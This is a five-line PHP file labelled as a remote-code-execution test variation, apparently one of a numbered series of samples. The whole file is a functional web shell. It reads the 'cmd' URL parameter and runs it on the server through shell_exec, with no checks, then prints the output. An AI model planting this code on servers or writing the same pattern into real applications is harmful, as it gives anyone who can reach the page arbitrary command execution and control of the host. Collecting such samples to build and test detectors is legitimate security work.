<?php
// RCE test variation #1172
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>